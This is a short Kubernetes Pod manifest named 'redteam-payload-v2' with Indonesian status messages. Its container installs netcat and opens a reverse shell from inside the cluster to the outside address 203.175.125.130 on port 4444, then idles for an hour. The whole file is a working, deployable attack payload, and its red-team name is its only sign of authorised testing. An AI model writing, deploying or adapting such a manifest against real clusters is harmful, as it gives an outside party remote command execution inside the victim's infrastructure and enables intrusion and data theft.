apiVersion: v1
kind: Pod
metadata:
  name: redteam-payload-v2
  namespace: backbase
spec:
  containers:
  - name: alpine
    image: alpine:latest
    command: ["/bin/sh"]
    args:
      - -c
      - |
        echo "=== Mencoba reverse shell ==="
        echo "Menginstall netcat..."
        apk add --update netcat-openbsd
        echo "Mencoba konek ke 203.175.125.130:4444..."
        nc -v 203.175.125.130 4444 -e /bin/sh 2>&1
        echo "Gagal konek! Keluar."
        sleep 3600
  restartPolicy: Never
